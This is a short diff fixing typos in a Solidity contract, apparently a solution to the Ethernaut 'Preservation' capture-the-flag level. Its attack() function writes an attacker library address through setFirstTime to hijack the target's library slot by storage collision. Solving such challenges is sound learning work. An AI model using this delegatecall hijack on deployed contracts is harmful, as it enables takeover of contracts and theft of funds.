@@ -69,12 +69,12 @@ contract Level16Solution is Ownable {
 
     constructor(address _target, address _attackLibrary) {
         target = Preservation(_target);
-        attackLibrary = new AttackLibraryContract(_attackLibrary);
-        attackLibraryAddress = _attackLibrary
+        attackLibrary = AttackLibraryContract(_attackLibrary);
+        attackLibraryAddress = _attackLibrary;
     }
 
     function attack() public onlyOwner {
-        uint256 _time = uint256(uint160(address(attachLibrary)));
+        uint256 _time = uint256(uint160(address(attackLibrary)));
         console.log("timeZone1Library before: ", target.timeZone1Library());
         target.setFirstTime(_time);
         console.log("timeZone1Library after: ", target.timeZone1Library());
